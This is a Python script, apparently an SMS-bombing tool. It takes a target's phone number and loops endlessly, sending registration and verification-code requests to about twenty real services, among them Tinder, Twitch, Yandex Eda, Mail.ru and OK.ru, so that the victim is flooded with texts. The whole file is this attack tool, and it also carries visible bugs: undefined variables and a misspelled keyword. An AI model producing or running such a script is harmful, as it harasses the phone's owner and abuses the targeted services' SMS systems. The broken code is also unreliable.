import requests
import random
import datetime
import time
import sys
import os
from colorama import Fore, Back
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
dark = Back.BLACK
bef = Fore.WHITE
iteration = 0
resh = "< ##############"
logo = '''
+--{×=============>
https://github.com/direskyfer/
+--{×=============>
'''
diskfe = "7########"
print(dark+"")
print(diskfe + "\n" + red + "My" + yellow + "GIT"+green+"HUB"+bef + logo)
_phone = input("phone: ")
print("\n")
print(resh + "Start >")
es = ""
er = " "
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
_name = ''
for x in range(30):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	passmegafon = random.choice(list('123456789'))

while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print("Grab"+es)
	except:
		pass
		
	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print("rutaxi"+es)
	except:
		pass
		
	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print("tinder"+es)
	except:
		pass
	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print('xyandex.Eda')
	except:
		pas

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('Youlo')
	except:
		pass

	try:
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print('Alpari')
	except:
		pass

	try:
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		print('anytime')
	except:
		pass

	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print('Dilevery')
	except:
		pass
	try:
		requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn',json={"msisdn":_phone,"password":passmegafon})
		print('Megafon')
	except:
		pass
	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('Twitch')
	except:
		pass

	try:
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print('CabWiFI')
	except:
		pass

	try:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print('wowworks')
	except:
		pass
	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		print('Lenta')
	except:
		pass

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print('Mail.ru')
	except:
		pass

	try:
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		print('Mvideo')
	except:
		pass

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print('OK.ru')
	except:
		pass

	try:
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		print("Plink")
	except:
		pass
	try:
		iteration += 1
		print(resh + interation +"= cycles done >")
	except:
		pass
